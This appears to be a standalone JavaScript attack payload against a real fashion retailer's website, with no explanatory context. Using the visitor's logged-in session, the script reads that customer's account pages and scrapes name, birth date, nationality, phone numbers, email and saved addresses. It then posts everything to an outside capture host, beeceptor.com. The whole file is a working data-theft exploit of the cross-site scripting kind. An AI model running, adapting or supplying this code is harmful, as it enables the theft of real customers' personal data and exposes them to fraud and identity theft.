(async function() {
    const response1 = await fetch('https://www.celine.com/fr-fr/client/account/personal-data', { method: 'GET', credentials: 'include' });
    const html1 = await response1.text();
    const parser1 = new DOMParser();
    const doc1 = parser1.parseFromString(html1, 'text/html');

    const data1 = {
        firstname: doc1.querySelector('[name="dwfrm_profile_customer_firstname"]')?.value || 'test',
        lastname: doc1.querySelector('[name="dwfrm_profile_customer_lastname"]')?.value || '',
        birthday: doc1.querySelector('[name="customer_birthday"]')?.value || '',
        nationality: doc1.querySelector('[name="dwfrm_profile_customer_nationality_nationality"]')?.value || '',
        phone1: doc1.querySelector('[name="dwfrm_profile_customer_phone1"]')?.value || '',
        phone2: doc1.querySelector('[name="dwfrm_profile_customer_phone2"]')?.value || '',
        phone3: doc1.querySelector('[name="dwfrm_profile_customer_phone3"]')?.value || '',
        phone4: doc1.querySelector('[name="dwfrm_profile_customer_phone4"]')?.value || '',
        phone5: doc1.querySelector('[name="dwfrm_profile_customer_phone5"]')?.value || '',
        email: doc1.querySelector('[name="dwfrm_profile_customer_email"]')?.value || ''
    };

    const response2 = await fetch('https://www.celine.com/fr-fr/client/account/adresses', { method: 'GET', credentials: 'include' });
    const html2 = await response2.text();
    const parser2 = new DOMParser();
    const doc2 = parser2.parseFromString(html2, 'text/html');

    const addresses = Array.from(doc2.querySelectorAll('[id^="uuid-"]')).map(el => el.textContent.trim()).join('\n');

    await fetch('https://nyxxx.free.beeceptor.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ personalData: data1, addresses })
    });
})();
